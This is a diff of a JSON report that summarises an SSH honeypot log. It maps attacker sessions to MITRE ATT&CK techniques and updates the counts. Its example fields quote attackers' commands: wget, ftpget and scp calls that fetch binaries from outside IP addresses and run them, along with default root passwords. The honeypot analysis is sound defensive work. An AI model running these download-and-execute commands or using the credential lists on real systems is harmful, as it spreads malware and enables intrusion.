@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-15 03:02:11",
+  "generated": "2026-09-15 04:05:08",
   "totals": {
-    "commands": 611,
-    "login_failed": 299,
-    "login_success": 194,
-    "sessions": 399
+    "commands": 648,
+    "login_failed": 427,
+    "login_success": 197,
+    "sessions": 538
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 299,
+      "count": 427,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-09-15T00:01:09.372940Z",
-      "last": "2026-09-15T03:01:38.296286Z",
-      "unique_ips": 26
+      "last": "2026-09-15T04:03:10.056639Z",
+      "unique_ips": 30
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 194,
+      "count": 197,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123456",
@@ -37,8 +37,8 @@
         "root / root123"
       ],
       "first": "2026-09-15T00:08:25.379657Z",
-      "last": "2026-09-15T02:59:25.186168Z",
-      "unique_ips": 13
+      "last": "2026-09-15T03:56:13.162491Z",
+      "unique_ips": 15
     },
     {
       "id": "T1083",
@@ -56,7 +56,7 @@
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 16,
+      "count": 31,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -65,14 +65,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T01:47:09.492394Z",
-      "unique_ips": 2
+      "last": "2026-09-15T03:39:59.312031Z",
+      "unique_ips": 3
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 4,
+      "count": 7,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -80,21 +80,21 @@
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T01:47:09.492394Z",
-      "unique_ips": 2
+      "last": "2026-09-15T03:39:59.312031Z",
+      "unique_ips": 3
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "id",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-15T01:24:06.195363Z",
-      "last": "2026-09-15T01:46:18.727748Z",
-      "unique_ips": 2
+      "last": "2026-09-15T03:39:07.763832Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
@@ -124,30 +124,46 @@
   "unmapped": [
     [
       "sh",
-      187
+      189
     ],
     [
       "system",
-      186
-    ],
-    [
-      "shell",
-      10
-    ],
-    [
-      "/bin/busybox UNSTABLE",
-      8
+      188
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
+      16
     ],
     [
-      "enable",
-      2
+      "shell",
+      12
+    ],
+    [
+      "/bin/busybox UNSTABLE",
+      9
     ],
     [
       "cd /proc && cat self/cmdline",
+      4
+    ],
+    [
+      "enable",
+      3
+    ],
+    [
+      "linuxshell",
+      2
+    ],
+    [
+      "enablelinuxshell",
+      2
+    ],
+    [
+      "ping ;sh",
+      2
+    ],
+    [
+      "/bin/busybox",
       2
     ],
     [
@@ -184,22 +200,6 @@
     ],
     [
       "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
-      1
-    ],
-    [
-      "linuxshell",
-      1
-    ],
-    [
-      "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
-      1
-    ],
-    [
-      "/bin/busybox",
       1
     ]
   ]
